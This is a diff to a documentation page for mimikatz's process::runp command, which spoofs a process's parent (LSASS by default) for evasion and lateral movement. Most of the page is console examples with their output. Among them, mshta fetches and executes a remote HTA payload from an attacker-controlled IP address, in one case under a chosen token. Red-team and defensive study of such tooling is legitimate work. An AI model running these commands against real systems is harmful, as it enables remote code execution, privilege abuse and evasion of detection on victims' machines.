@@ -1,17 +1,17 @@
 # runp
 
-Run a subprocess under a parent process \(Default parent process is `LSASS.exe`\). It can also be used for lateral movement and process spoofing. It has the following command line arguments:
+`process::runp` runs a subprocess under a parent process (Default parent process is `LSASS.exe`). It can also be used for lateral movement and process spoofing. It has the following command line arguments:
 
 * `/run`: the name of the process
 * `/ppid`: the parent process ID
 * `/token`: The specified token privileges to run the new process. It can be found with `token::list`
 
-```text
+```
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
 
-```text
+```
 mimikatz # process::runp /run:notepad.exe
 [pid] no argument, default for LSASS
 Run : notepad.exe
@@ -22,7 +22,7 @@ PID: 728 - TID: 2916
 
 #### Run under a specified process
 
-```text
+```
 mimikatz # process::runp /run:notepad.exe /ppid:6388
 Run : notepad.exe
 PPID: 6388
@@ -32,7 +32,7 @@ PID: 7360 - TID: 8488
 
 #### mshta payload execution example
 
-```text
+```
 mimikatz # process::runp /run:"mshta http://192.168.0.220:80/delivery.hta" /ppid:2948
 Run : mshta http://192.168.0.220:80/delivery.hta
 PPID: 2948
@@ -42,7 +42,7 @@ PID: 7928 - TID: 1300
 
 #### mshta payload execution under a specified token
 
-```text
+```
 mimikatz # process::runp /run:"mshta http://192.168.0.220:80/delivery.hta" /ppid:2948 /token:1
 Run : mshta http://192.168.0.220:80/delivery.hta
 PPID: 2948
@@ -74,4 +74,3 @@ PID: 7980 - TID: 9060
    P:[DE  ]    SeCreateGlobalPrivilege
    P:[    ]    SeTrustedCredManAccessPrivilege
 ```
-
